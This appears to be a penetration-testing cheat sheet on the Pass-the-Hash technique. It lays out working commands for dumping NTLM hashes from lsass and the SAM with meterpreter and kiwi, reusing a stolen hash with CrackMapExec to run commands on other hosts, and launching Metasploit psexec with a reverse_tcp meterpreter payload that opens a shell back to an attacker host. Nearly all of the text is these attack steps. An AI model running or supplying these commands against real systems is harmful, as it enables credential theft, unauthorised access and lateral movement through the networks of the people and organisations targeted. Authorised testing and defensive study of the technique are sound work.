# Pass-the-Hash (PtH)

NTLM authentication accepts the hash itself — no plaintext password required.
Grab an NTLM hash from a compromised host (SAM/LSASS), then authenticate to
another host with the same hash for lateral movement. No cracking involved.

All addresses/hashes are placeholders.

## NTLM hash format

```
LM:NTLM      e.g. aad3b435...:5f4dcc3b5aa765d61d8327deb882cf99
```

PtH uses the **NTLM** part. With only NTLM, prefix an empty LM:
`aad3b435b51404eeaad3b435b51404ee:<NTLM>`.

## Step 1 — dump hashes (meterpreter + kiwi)

```bash
getuid
pgrep lsass                   # find lsass.exe PID
migrate <lsass_pid>           # migrate into lsass → access LSA secrets
load kiwi
lsa_dump_sam                  # dump local SAM → NTLM hashes
creds_all
# built-in alternative:
hashdump                      # SAM hashes in LM:NTLM format
```

## Step 2a — Pass-the-Hash with CrackMapExec (quick validation)

```bash
crackmapexec smb <TARGET_IP> -u administrator -H "<NTLM_hash>"
# "Pwn3d!" → the hash works
crackmapexec smb <TARGET_IP> -u administrator -H "<NTLM_hash>" -x "whoami"
```

## Step 2b — Pass-the-Hash with Metasploit psexec (full shell)

```bash
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser administrator
set SMBPass <LM:NTLM>
set target 2                  # Native upload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
run
```

## Notes

- `migrate` into **lsass.exe** is a prerequisite for kiwi/mimikatz to read LSA secrets.
- PtH bypasses cracking entirely — the service validates the hash, not the password.
- CrackMapExec = fast spray to find which hosts accept the hash; psexec = interactive shell.
